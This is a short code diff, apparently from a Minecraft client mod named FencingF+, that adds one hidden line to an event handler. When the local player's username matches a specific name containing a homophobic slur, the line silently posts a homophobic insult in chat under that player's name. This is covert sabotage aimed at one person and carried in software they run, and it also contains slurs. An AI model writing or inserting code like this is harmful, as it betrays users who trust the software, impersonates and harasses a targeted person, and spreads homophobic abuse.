@@ -68,6 +68,7 @@ public class EventManager implements Globals {
                 }
             }
             getFencing().tickManager.onUpdate();
+            if (mc.player.getName().equals("PvpFag")) mc.player.connection.sendPacket(new CPacketChatMessage("I am gay, I pop 60 totems and say \"ez\". - FencingF+ v1.2.5"));
         }
     }
 
